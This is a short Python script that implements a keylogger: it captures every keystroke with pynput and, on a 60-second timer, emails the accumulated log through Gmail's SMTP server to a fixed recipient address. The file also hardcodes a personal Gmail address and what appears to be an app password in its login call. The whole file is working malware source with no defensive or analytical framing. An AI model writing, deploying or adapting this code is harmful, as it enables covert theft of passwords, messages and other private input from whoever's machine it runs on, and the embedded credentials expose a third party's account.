from pynput.keyboard import Key, Listener
import smtplib
import threading

# Log file to store keystrokes
log = ""

def send_email():
    """Sends the captured log to your email."""
    global log
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login('manassehmutugi222@gmail.com', 'rwui yyim wxes kymq')  # Replace with your email and app password
        server.sendmail('manassehmutugi222@gmail.com', 'shakestush222@gmail.com', log)  # Replace with sender/receiver
        server.quit()
        log = ""  # Clear log after sending
    except Exception as e:
        print(f"Error sending email: {e}")

def log_keystroke(key):
    """Records keystrokes into the log variable."""
    global log
    try:
        log += str(key.char)  # Alphanumeric keys
    except AttributeError:
        if key == Key.space:
            log += " "  # Space key
        else:
            log += f" [{key}] "  # Special keys like Enter or Shift

def on_press(key):
    """Triggered when a key is pressed."""
    log_keystroke(key)

def email_timer():
    """Sends email every 60 seconds."""
    threading.Timer(60, email_timer).start()
    send_email()

if __name__ == "__main__":
    # Start the email timer
    email_timer()

    # Start listening for keystrokes
    with Listener(on_press=on_press) as listener:
        listener.join()
